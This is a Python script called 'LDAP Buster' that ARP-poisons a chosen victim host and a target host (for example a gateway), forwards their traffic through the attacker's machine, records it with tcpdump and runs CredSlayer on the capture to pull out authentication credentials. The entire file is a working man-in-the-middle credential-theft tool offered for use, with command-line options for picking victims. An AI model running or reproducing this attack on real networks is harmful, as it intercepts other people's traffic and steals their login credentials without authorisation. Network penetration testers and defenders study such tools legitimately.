from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import threading
import time
import subprocess
import argparse
import logging
import credslayer

print("LDAP Buster")
print("By: Hann1bl3L3ct3r")
print("Script to target two devices for ARP poisoning to capture authentication information which is saved to a file and parsed with CredSlayer.")
print("Note: Must be run as ROOT")
print("\n")

# Suppress specific scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Enable IP forwarding on the attacker's machine
def enable_ip_forwarding():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')
    print("[*] IP forwarding enabled.")

# Function to get MAC address
def get_mac(ip):
    ans, _ = arping(ip, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    else:
        print(f"[!] Could not find MAC address for IP: {ip}")
        sys.exit(1)

# ARP Poisoning
def arp_poison(victim_ip, target_ip, stop_event):
    victim_mac = get_mac(victim_ip)
    target_mac = get_mac(target_ip)
    
    # ARP packets for poisoning
    victim_arp = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, psrc=target_ip, hwdst=victim_mac)
    target_arp = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=victim_ip, hwdst=target_mac)
    
    print("[*] Starting ARP poisoning...")
    try:
        while not stop_event.is_set():
            sendp(victim_arp, verbose=0)  # Poison victim
            sendp(target_arp, verbose=0)  # Poison target
            time.sleep(2)  # Repeat every 2 seconds
    except KeyboardInterrupt:
        print("\n[!] Stopping ARP poisoning...")

# Restore ARP tables to normal
def restore_arp(victim_ip, target_ip):
    victim_mac = get_mac(victim_ip)
    target_mac = get_mac(target_ip)
    
    # Send ARP packets to restore the original state
    send(ARP(op=2, pdst=victim_ip, psrc=target_ip, hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=4, verbose=0)
    send(ARP(op=2, pdst=target_ip, psrc=victim_ip, hwsrc=victim_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=4, verbose=0)
    print("[*] ARP tables restored.")

# Packet forwarding between victim and target
def forward_packets(victim_ip, target_ip, stop_event):
    print("[*] Starting packet forwarding between victim and target...")
    
    # Pre-resolve MAC addresses to avoid using broadcast addresses
    victim_mac = get_mac(victim_ip)
    target_mac = get_mac(target_ip)
    
    def forward(packet):
        # Forward packets between victim and target
        if IP in packet:
            # Forward from victim to target
            if packet[IP].src == victim_ip:
                packet[Ether].dst = target_mac
                sendp(packet, verbose=0)  # Use sendp() with Ethernet layer to avoid broadcast
            # Forward from target to victim
            elif packet[IP].src == target_ip:
                packet[Ether].dst = victim_mac
                sendp(packet, verbose=0)  # Use sendp() with Ethernet layer to avoid broadcast

    # Start sniffing and forwarding packets while not stopped
    sniff(filter="ip", prn=forward, stop_filter=lambda _: stop_event.is_set())

# Start tcpdump to capture traffic
def start_tcpdump(output_file):
    tcpdump_cmd = ["tcpdump", "-w", output_file]
    print(f"[*] Starting tcpdump to capture traffic into {output_file}...")
    return subprocess.Popen(tcpdump_cmd)

# Run CredSlayer on the captured file
def run_credslayer_on_capture(capture_file):
    print(f"[*] Running CredSlayer on {capture_file}...")
    try:
        results = credslayer.process_pcap(capture_file)
        for cred in results:
            print(f"Found Credential: {cred}")
    except Exception as e:
        print(f"[!] Error running CredSlayer: {e}")

# Main function to handle CLI arguments and start processes
def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="ARP poison two hosts and forward traffic.")
    parser.add_argument("--victim", required=True, help="IP address of the victim host.")
    parser.add_argument("--target", required=True, help="IP address of the target host (e.g., gateway).")
    parser.add_argument("--output", required=True, help="Output file for the tcpdump capture (e.g., capture.pcap).")
    args = parser.parse_args()

    victim_ip = args.victim
    target_ip = args.target
    output_file = args.output

    # Enable IP forwarding
    enable_ip_forwarding()

    # Create an event to signal threads to stop
    stop_event = threading.Event()

    # Start tcpdump
    tcpdump_process = start_tcpdump(output_file)
    print(f"[*] tcpdump started and writing to {output_file}")

    # Start ARP poisoning in a thread
    arp_thread = threading.Thread(target=arp_poison, args=(victim_ip, target_ip, stop_event))
    arp_thread.start()

    # Start packet forwarding in a separate thread
    forward_thread = threading.Thread(target=forward_packets, args=(victim_ip, target_ip, stop_event))
    forward_thread.start()

    # Wait for user input to stop
    try:
        input("[*] Press Enter to stop the capture and begin parse...\n")
    except KeyboardInterrupt:
        print("[!] Interrupted by user.")

    # Set stop event and wait for threads to finish
    stop_event.set()
    arp_thread.join()
    forward_thread.join()

    # Stop tcpdump
    tcpdump_process.terminate()
    tcpdump_process.wait()
    print(f"[*] tcpdump stopped and saved to {output_file}.")
    print("[*] Starting Parse...")

    # Restore ARP tables
    restore_arp(victim_ip, target_ip)

    # Run CredSlayer on the captured file
    run_credslayer_on_capture(output_file)

if __name__ == "__main__":
    main()
